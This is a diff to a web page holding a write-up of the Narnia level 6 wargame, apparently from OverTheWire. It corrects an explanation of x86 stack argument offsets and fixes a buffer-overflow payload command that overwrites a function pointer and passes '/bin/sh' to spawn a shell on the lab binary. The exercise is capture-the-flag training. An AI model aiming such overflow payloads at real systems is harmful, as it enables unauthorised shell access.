@@ -44,12 +44,12 @@ category: projects
       Snap: <br>
       <img src="/static/images/projects/p15/i2.png" class="image-center image-biggest" />
 
-      <li>Now pass this as argument to file after 8 bytes of "A"s. Where to put the "/bin/sh" to this function is the next question. Function's store their arguments generally at %esp+8,$esp+16 and so on. So We need to store "/bin/sh" 8 bytes from function call. We have 8 bytes of b2 in between after which we could give "/bin/sh"</li>
+      <li>Now pass this as argument to file after 8 bytes of "A"s. Where to put the "/bin/sh" to this function is the next question. Function's store their arguments generally at %ebp+8,%ebp+12 and so on(Formula is <b>%(ebp +8 +4*(N-1))</b>). So We need to store "/bin/sh" 8 bytes from function call. We have 8 bytes of b2 in between after which we could give "/bin/sh"</li>
       <li>Now construct the payload and run the program.</li>
 
       <pre class="prettyprint">
         <code>
-        /narnia/narnia6 "$(python -c "print 'A'*8 + '\x50\xc8\xe4\xff')" "$(python -c "print 'A'*8 + '\bin\sh')"
+        /narnia/narnia6 "$(python -c "print 'A'*8 + '\x50\xc8\xe4\xff')" "$(python -c "print 'A'*8 + '/bin/sh')"
       </code>
       </pre>
 
